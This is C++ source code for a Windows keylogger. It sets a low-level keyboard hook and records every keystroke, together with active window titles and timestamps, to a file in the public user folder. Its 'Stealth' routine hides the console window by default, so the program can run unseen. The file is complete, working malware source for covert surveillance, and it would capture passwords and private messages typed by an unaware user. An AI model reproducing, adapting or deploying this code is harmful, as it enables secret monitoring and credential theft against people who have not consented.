#define UNICODE

#include <map>
#include <ctime>
#include <mutex>
#include <cstring>
#include <fstream>
#include <sstream>
#include <iostream>
#include <Windows.h>


// defines whether the window is visible or not
// should be solved with makefile, not in this file
#define invisible // (visible / invisible)

// defines which format to use for logging
// 0 for default, 10 for dec codes, 16 for hex codex
#define FORMAT 0

// defines if ignore mouse clicks
#define mouse_ignore

// variable to store the HANDLE to the hook. Don't declare it anywhere else then globally or
// you will get problems since every function uses this variable.
#if FORMAT == 0

const std::map<int, std::string> key_name{
        {VK_LBUTTON,          "[LeftMouseBUTTON]"},
        {VK_RBUTTON,          "[RightMouseBUTTON]"},
        {VK_MBUTTON,          "[MiddleMouseBUTTON]"},
        {VK_XBUTTON1,         "[X1MouseBUTTON]"},
        {VK_XBUTTON2,         "[X2MouseBUTTON]"},
        {VK_BACK,             "[BACKSPACE]"},
        {VK_TAB,              "[TAB]"},
        {VK_CLEAR,            "[CLEAR]"},
        {VK_RETURN,           "[ENTER]"},
        {VK_SHIFT,            "[SHIFT]"},
        {VK_CONTROL,          "[CONTROL]"},
        {VK_MENU,             "[ALT]"},
        {VK_PAUSE,            "[PAUSE]"},
        {VK_CAPITAL,          "[CAPSLOCK]"},
        {VK_ESCAPE,           "[ESCAPE]"},
        {VK_SPACE,            " "},
        {VK_PRIOR,            "[PG_UP]"},
        {VK_NEXT,             "[PG_DOWN]"},
        {VK_END,              "[END]"},
        {VK_HOME,             "[HOME]"},
        {VK_LEFT,             "[LEFT]"},
        {VK_UP,               "[UP]"},
        {VK_RIGHT,            "[RIGHT]"},
        {VK_DOWN,             "[DOWN]"},
        {VK_SELECT,           "[SELECT]"},
        {VK_PRINT,            "[PRINT]"},
        {VK_EXECUTE,          "[EXECUTE]"},
        {VK_SNAPSHOT,         "[SNAPSHOT]"},
        {VK_INSERT,           "[INSERT]"},
        {VK_DELETE,           "[DELETE]"},
        {VK_HELP,             "[HELP]"},
        {VK_LWIN,             "[LeftWIN]"},
        {VK_RWIN,             "[RightWIN]"},
        {VK_APPS,             "[APPs]"},
        {VK_SLEEP,            "[SLEEP]"},
        {VK_F1,               "[F1]"},
        {VK_F2,               "[F2]"},
        {VK_F3,               "[F3]"},
        {VK_F4,               "[F4]"},
        {VK_F5,               "[F5]"},
        {VK_F6,               "[F6]"},
        {VK_F7,               "[F7]"},
        {VK_F8,               "[F8]"},
        {VK_F9,               "[F9]"},
        {VK_F10,              "[F10]"},
        {VK_F11,              "[F11]"},
        {VK_F12,              "[F12]"},
        {VK_NUMLOCK,          "[NUMLOCK]"},
        {VK_SCROLL,           "[SCROLL]"},
        {VK_LSHIFT,           "[LeftSHIFT]"},
        {VK_RSHIFT,           "[RightSHIFT]"},
        {VK_LCONTROL,         "[LeftCONTROL]"},
        {VK_RCONTROL,         "[RightCONTROL]"},
        {VK_LMENU,            "[LeftALT]"},
        {VK_RMENU,            "[RightALT]"},
        {VK_VOLUME_MUTE,      "[VOLUME_MUTE]"},
        {VK_VOLUME_DOWN,      "[VOLUME_DOWN]"},
        {VK_VOLUME_UP,        "[VOLUME_UP]"},
        {VK_MEDIA_NEXT_TRACK, "[MEDIA_NEXT_TRACK]"},
        {VK_MEDIA_PREV_TRACK, "[MEDIA_PREV_TRACK]"},
        {VK_MEDIA_STOP,       "[MEDIA_STOP]"},
        {VK_MEDIA_PLAY_PAUSE, "[MEDIA_PLAY_PAUSE]"},
        {VK_PLAY,             "[PLAY]"},
        {VK_ZOOM,             "[ZOOM]"},
        {VK_OEM_PERIOD,       "."},
        {VK_DECIMAL,          "."},
        {VK_OEM_PLUS,         "+"},
        {VK_OEM_MINUS,        "-"},
        {VK_ADD,              "+"},
        {VK_SUBTRACT,         "-"},
};
#endif
HHOOK _hook;

// This struct contains the data received by the hook callback. As you see in the callback function
// it contains the thing you will need: vkCode = virtual key code.
KBDLLHOOKSTRUCT kbdStruct;

int Save(int key_stroke);

std::ofstream output_file;

// This is the callback function. Consider it the event that is raised when, in this case, a key is pressed.
LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0) {
        // the action is valid: HC_ACTION.
        if (wParam == WM_KEYDOWN) {
            // lParam is the pointer to the struct containing the data needed, so cast and assign it to kdbStruct.
            kbdStruct = *((KBDLLHOOKSTRUCT*)lParam);

            // save to file
            Save(kbdStruct.vkCode);
        }
    }

    // call the next hook in the hook chain. This is necessary or your hook chain will break and the hook stops
    return CallNextHookEx(_hook, nCode, wParam, lParam);
}

void SetHook() {
    // Set the hook and set it to use the callback function above
    // WH_KEYBOARD_LL means it will set a low level keyboard hook. More information about it at MSDN.
    // The last 2 parameters are NULL, 0 because the callback function is in the same thread and window as the
    // function that sets and releases the hook.
    if (!(_hook = SetWindowsHookEx(WH_KEYBOARD_LL, HookCallback, nullptr, 0))) {
        LPCWSTR a = L"Failed to install hook!";
        LPCWSTR b = L"Error";
        MessageBox(nullptr, a, b, MB_ICONERROR);
    }
}

void ReleaseHook() {
    UnhookWindowsHookEx(_hook);
}

inline std::tm localtime_xp(std::time_t timer) {
    std::tm bt{};
#if defined(__unix__)
    localtime_r(&timer, &bt);
#elif defined(_MSC_VER)
    localtime_s(&bt, &timer);
#else
    static std::mutex mtx;
    std::lock_guard<std::mutex> lock(mtx);
    bt = *std::localtime(&timer);
#endif
    return bt;
}

inline std::string time_stamp(const std::string& fmt = "%F %T") { // default = "YYYY-MM-DD HH:MM:SS"

    auto bt = localtime_xp(std::time(nullptr));
    char buf[64];
    return { buf, std::strftime(buf, sizeof(buf), fmt.c_str(), &bt) };
}

int Save(int key_stroke) {
    std::stringstream output;
    static char last_window[256] = "";
#ifndef mouse_ignore
    if ((key_stroke == 1) || (key_stroke == 2)) {
        return 0; // ignore mouse clicks
    }
#endif
    HWND foreground = GetForegroundWindow();
    DWORD threadID;
    HKL layout = nullptr;

    if (foreground) {
        // get keyboard layout of the thread
        threadID = GetWindowThreadProcessId(foreground, nullptr);
        layout = GetKeyboardLayout(threadID);
    }

    if (foreground) {
        char window_title[256];
        GetWindowTextA(foreground, (LPSTR)window_title, 256);

        if (strcmp(window_title, last_window) != 0) {
            strcpy_s(last_window, window_title);

            output << "\n\n[" << time_stamp() << "] (" << window_title << ")\n";
        }
    }

#if FORMAT == 10
    output << '[' << key_stroke << ']';
#elif FORMAT == 16
    output << std::hex << "[" << key_stroke << ']';
#else
    if (key_name.find(key_stroke) != key_name.end()) {
        output << key_name.at(key_stroke);
    }
    else {
        char key;
        // check caps lock
        bool lowercase = ((GetKeyState(VK_CAPITAL) & 0x0001) != 0);

        // check shift key
        if ((GetKeyState(VK_SHIFT) & 0x1000) != 0 || (GetKeyState(VK_LSHIFT) & 0x1000) != 0
            || (GetKeyState(VK_RSHIFT) & 0x1000) != 0) {
            lowercase = !lowercase;
        }

        // map virtual key according to keyboard layout
        key = MapVirtualKeyExA(key_stroke, MAPVK_VK_TO_CHAR, layout);

        // tolower converts it to lowercase properly
        if (!lowercase) {
            key = tolower(key);
        }
        output << char(key);
    }
#endif
    // instead of opening and closing file handlers every time, keep file open and flush.
    output_file << output.str();
    output_file.flush();

    std::cout << output.str();

    return 0;
}

void Stealth() {
#ifdef visible
    ShowWindow(FindWindowA("ConsoleWindowClass", nullptr), 1); // visible window
#endif

#ifdef invisible
    ShowWindow(FindWindowA("ConsoleWindowClass", nullptr), 0); // invisible window
#endif
}

int main() {
    // open output file in append mode
    const char* output_filename = R"(C:\Users\Public\KYLGGR.out)";
    std::cout << "Logging output to " << output_filename << std::endl;
    output_file.open(output_filename, std::ios_base::app);

    // visibility of window
    Stealth();

    // set the hook
    SetHook();

    // loop to keep the console application running.
    MSG msg;
    while (GetMessage(&msg, nullptr, 0, 0)) {
    }
}